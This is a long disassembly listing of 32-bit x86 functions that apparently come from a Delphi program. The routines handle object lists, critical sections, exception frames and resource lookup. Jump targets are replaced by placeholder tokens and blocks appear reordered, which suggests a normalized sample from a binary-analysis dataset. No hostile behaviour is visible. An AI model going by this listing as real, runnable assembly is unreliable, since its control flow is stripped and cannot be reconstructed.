add esp 0xfffffef4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_412a2b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4031e0
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404244
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4128ec
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_413918
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412a32
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b588
call sub_403a1c
sub_412a50
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
call sub_405004
cmp ebx eax
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_412a70
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_413a74
mov edx edi
call sub_412a50
test al al
je r-xdata
mov eax [ esi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_413a74
mov edx edi
call sub_412a50
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_413964
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx edi
call sub_412a50
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_413964
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_412b14
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax [ edi + 0x20 ]
cmp eax [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ edi + 0x20 ] eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x4 ]
mov edx ebp
call sub_413a74
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_41294c
mov [ ebx + 0x10 ] al
inc ebp
dec esi
jne r-xdata
sub_412b60
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403260
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
call InitializeCriticalSection
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_412830
mov esi eax
mov eax [ edi + 0x4 ]
mov edx esi
call sub_413918
mov [ esi + 0x10 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_412bd4
push ebx
push esi
push edi
push ebp
call sub_40361c
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
mov eax [ esi + 0x4 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
mov eax [ esi + 0x4 ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403604
mov eax [ esi + 0x4 ]
mov edx edi
call sub_413a74
call sub_403290
inc edi
dec ebp
jne r-xdata
sub_412c30
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor esi esi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_413a74
mov edx [ esp ]
push edx
mov ecx esi
mov edx eax
mov eax [ r-xdata ]
call sub_4127c0
mov esi eax
inc edi
dec ebx
jne r-xdata
sub_412c74
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor edi edi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
test edi edi
jne r-xdata
mov edx [ esp ]
call sub_4128ec
mov edi eax
inc esi
dec ebx
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx esi
call sub_413a74
cmp [ eax + 0x10 ] 0x0
je r-xdata
sub_412cb8
push ebp
mov ebp esp
add esp 0xfffffef4
xor eax eax
mov [ ebp - 0x10c ] eax
xor eax eax
push ebp
push sub_412d3b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4031e0
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4cc
call sub_403a1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412d42
lea eax [ ebp - 0x10c ]
call sub_403fe0
retn
sub_412d48
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_412c30
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_412754
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_412cb8
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_413a74
mov edi eax
cmp edi [ ebp - 0x10 ]
je r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413a74
mov esi eax
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4034bc
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_412c30
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413964
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_413918
sub_412e34
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_413a74
mov edx ebp
call sub_412a38
test al al
jne r-xdata
sub_412e78
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_412830
mov edx eax
mov eax [ edi + 0x4 ]
call sub_413918
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_413a74
mov eax [ eax + 0xc ]
mov edx ebp
call sub_413ad0
test eax eax
jge r-xdata
sub_412ed4
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413a74
mov esi eax
mov edx ebp
mov eax esi
call sub_412a70
mov eax [ esi + 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax esi
call sub_403290
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413964
sub_412f24
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403260
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ rw-data ]
call sub_412e10
xor eax eax
push ebp
push sub_413023
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41302a
mov eax [ rw-data ]
call sub_412ec8
retn
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413918
inc esi
xor edi edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_413a74
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_41294c
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413918
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_413a74
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
sub_41302a
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_413050
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_413080
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_412e10
xor edx edx
push ebp
push sub_4130f7
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_412ec8
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
call sub_403ac8
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_413a74
mov edx [ ebp - 0x4 ]
call sub_4128ec
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_413114
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_413174
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4cc
call sub_403a1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41317b
lea eax [ ebp - 0xc ]
call sub_403fe0
retn
sub_413180
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_412e10
xor eax eax
push ebp
push sub_4131c6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_412c74
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4131cd
mov eax [ rw-data ]
call sub_412ec8
retn
sub_4131d4
push ebx
push esi
mov esi eax
mov eax esi
call sub_413180
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_413114
sub_4131f4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_412e10
xor eax eax
push ebp
push sub_413259
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_412e34
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_412e1c
cmp ebx [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413260
mov eax [ rw-data ]
call sub_412ec8
retn
mov eax ebx
call sub_40321c
mov ebx eax
sub_413264
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_412e10
xor eax eax
push ebp
push sub_4132a6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_412ed4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4132ad
mov eax [ rw-data ]
call sub_412ec8
retn
sub_4132b0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_412e10
xor eax eax
push ebp
push sub_4132f2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_412e78
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4132f9
mov eax [ rw-data ]
call sub_412ec8
retn
sub_4132fc
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
call sub_412e10
xor eax eax
push ebp
push sub_413343
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ rw-data ]
call sub_412d48
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41334a
mov eax [ rw-data ]
call sub_412ec8
retn
sub_413350
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_412e10
xor eax eax
push ebp
push sub_41339e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ rw-data ]
call sub_412b14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4133a5
mov eax [ rw-data ]
call sub_412ec8
retn
sub_413404
push ebp
mov ebp esp
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
pop ebp
retn 0x8
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_41343c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_413404
mov edx eax
mov eax [ rw-data ]
call sub_413d58
pop edi
pop esi
pop ebx
retn
sub_413468
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_413de0
mov esi eax
xor edx edx
push ebp
push sub_4134d2
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413e44
retn
mov edx ebx
mov eax esi
call sub_413a74
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_403ac8
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4134e4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
inc esi
lea ebx [ ecx + 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebx - 0x4 ]
mov [ edx ] ecx
jmp r-xdata
mov edx edi
mov eax [ ebx ]
call sub_407ce4
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_413524
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov [ ebp - 0x5 ] 0x0
inc esi
mov ebx [ ebp - 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax edi
mov edx [ ebx + 0x4 ]
call sub_404034
jmp r-xdata
cmp eax [ ebx ]
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_413568
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov esi ebx
mov edx esi
mov eax [ rw-data ]
call sub_413ad0
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ rw-data ]
call sub_413918
sub_4135c0
push ebx
push esi
push edi
mov esi eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ebx [ edx + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_413a74
mov edi eax
mov eax esi
call edi
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_413600
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_4135c0
test eax eax
sete al
pop ebx
retn
mov eax ebx
call [ rw-data ]
pop ebx
retn
sub_413624
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
test ebx ebx
jne r-xdata
push 0xa
mov eax edi
call sub_4044a0
push eax
push ebx
call FindResourceA
test eax eax
setne al
test al al
je r-xdata
mov ebx [ rw-data ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push 0xa
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_415f5c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_413698
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_415a5c
mov [ esi ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403290
retn
sub_4136a8
push ebx
call sub_405d7c
mov ebx [ eax + 0xc ]
test ebx ebx
jne r-xdata
call sub_405d7c
mov edx [ eax + 0x8 ]
mov eax ebx
call sub_413918
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov ebx eax
call sub_405d7c
mov [ eax + 0x8 ] ebx
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov ebx eax
call sub_405d7c
mov [ eax + 0xc ] ebx
sub_413700
push ebx
push esi
push edi
call sub_405d7c
mov edi [ eax + 0x8 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_413a74
mov edx [ eax ]
call [ edx + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_413730
push ebx
push esi
call sub_405d7c
mov eax [ eax + 0x8 ]
call sub_403290
call sub_405d7c
mov ebx [ eax + 0xc ]
mov eax ebx
call sub_413b5c
mov esi eax
call sub_405d7c
mov [ eax + 0x8 ] esi
mov edx [ ebx + 0x8 ]
dec edx
mov eax ebx
call sub_413964
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
call sub_405d7c
xor edx edx
mov [ eax + 0xc ] edx
mov eax ebx
call sub_403290
sub_41378c
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_413822
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp esi [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413829
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_40321c
call sub_41378c
pop ecx
mov ebx eax
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4031e0
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404244
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_40502c
call sub_40507c
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
pop eax
call sub_413624
or bl al
sub_413834
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_4138e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
sete [ ebp - 0xa ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_4138c3
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x4 ]
call sub_4031d8
call sub_41378c
pop ecx
mov [ ebp - 0x9 ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_4136a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4138ca
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_413700
retn
call sub_413730
sub_4138f8
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_413918
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax esi
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_413964
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413a00
cmp esi [ ebx + 0x8 ]
jl r-xdata
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_4028b8
mov edx esi
mov eax ebx
call sub_413a74
mov edi eax
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cl 0x2
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4139c8
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_4139c4
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4cc
jmp sub_403a1c
sub_413a00
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_413a48
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_405b10
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_4139c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413a4f
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_413a74
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413a00
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 ]
pop esi
pop ebx
retn
sub_413a9c
mov edx [ eax + 0xc ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov ecx edx
test ecx ecx
jns r-xdata
mov ecx 0x4
mov ecx 0x10
jmp r-xdata
sar ecx 0x2
jmp r-xdata
add ecx 0x3
add ecx edx
mov edx ecx
call sub_413bd8
retn
sub_413ad0
push ebx
xor ecx ecx
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jge r-xdata
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov ebx [ eax + 0x4 ]
cmp edx [ ebx + ecx * 4 ]
jne r-xdata
mov eax ecx
pop ebx
retn
or ecx 0xffffffff
inc ecx
sub_413af0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413a00
cmp esi [ ebx + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 + 0x4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 ]
call sub_4028b8
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_413b68
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413a00
cmp esi [ ebx + 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edx + esi * 4 ] edi
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + esi * 4 ]
cmp edi eax
je r-xdata
test edi edi
je r-xdata
mov cl 0x2
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_413bb8
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_413ad0
mov esi eax
test esi esi
